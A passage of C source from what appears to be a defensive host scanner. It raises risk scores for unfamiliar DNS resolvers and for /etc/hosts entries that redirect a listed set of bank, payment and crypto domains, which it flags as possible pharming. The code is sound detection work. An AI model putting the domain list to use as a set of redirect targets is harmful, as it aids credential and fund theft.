                        (strncmp(ip, "172.", 4) == 0 &&
                         atoi(ip + 4) >= 16 && atoi(ip + 4) <= 31)); /* RFC-1918 only */
                    if (!is_known) {
                        v.score += 20;
                        if (v.n_reasons < HLSE_NET_MAX_REASONS)
                            snprintf(v.reasons[v.n_reasons++],
                                sizeof(v.reasons[0]),
                                "N3: Unfamiliar DNS resolver: %s "
                                "(verify this is your ISP or VPN)", ip);
                    }
                }
            }
            fclose(fp);

            if (ns_count == 0) {
                v.score += 15;
                if (v.n_reasons < HLSE_NET_MAX_REASONS)
                    snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                        "N3: No DNS nameserver configured in resolv.conf");
            }
        }
    }

    /* N4: /etc/hosts banking/exchange redirect check */
    {
        FILE *fp = hlse_open_system_file("/etc/hosts");
        if (fp) {
            char line[512];
            const char *sensitive_domains[] = {
                /* US banks */
                "chase.com", "bankofamerica.com", "wellsfargo.com",
                "citi.com", "usbank.com", "capitalone.com", "pnc.com",
                /* Payment */
                "paypal.com", "venmo.com", "cashapp.com", "zelle.com",
                "stripe.com", "square.com",
                /* Crypto exchanges */
                "coinbase.com", "binance.com", "kraken.com",
                "blockchain.com", "bitfinex.com", "bybit.com",
                "okx.com", "kucoin.com", "crypto.com", "gate.io",
                /* Crypto wallets / DeFi */
                "metamask.io", "ledger.com", "trezor.io",
                "exodus.com", "trustwallet.com", "phantom.app",
                /* EU neobanks */
                "revolut.com", "wise.com", "n26.com", "ing.com",
                "transferwise.com",
                /* JP banks */
                "smbc.co.jp", "mufg.jp", "mizuhobank.co.jp",
                "rakuten-bank.co.jp", "japanpost.jp",
                /* KR banks */
                "kbstar.com", "ibk.co.kr", "nonghyup.com", "shinhan.com",
                /* CN payment */
                "alipay.com", "pay.weixin.qq.com",
                NULL
            };

            while (fgets(line, sizeof(line), fp)) {
                int di;
                if (line[0] == '#' || line[0] == '\n') continue;
                /* Skip localhost entries */
                if (strstr(line, "127.0.0.1") && strstr(line, "localhost"))
                    continue;
                if (strstr(line, "::1") && strstr(line, "localhost"))
                    continue;

                for (di = 0; sensitive_domains[di]; di++) {
                    if (strstr(line, sensitive_domains[di])) {
                        v.score += 50;
                        if (v.n_reasons < HLSE_NET_MAX_REASONS)
                            snprintf(v.reasons[v.n_reasons++],
                                sizeof(v.reasons[0]),
                                "N4: HOSTS FILE REDIRECT — banking domain "
                                "'%s' redirected (possible pharming attack)",
                                sensitive_domains[di]);
                        break;
                    }
                }
            }
            fclose(fp);
        }
    }

    if (v.score > 100) v.score = 100;
    /* Reasons embed hostnames read from attacker-writable system state. */
    {
        int i;
        for (i = 0; i < v.n_reasons; i++)
            hlse_sanitize_display(v.reasons[i]);
    }
    return v;
}
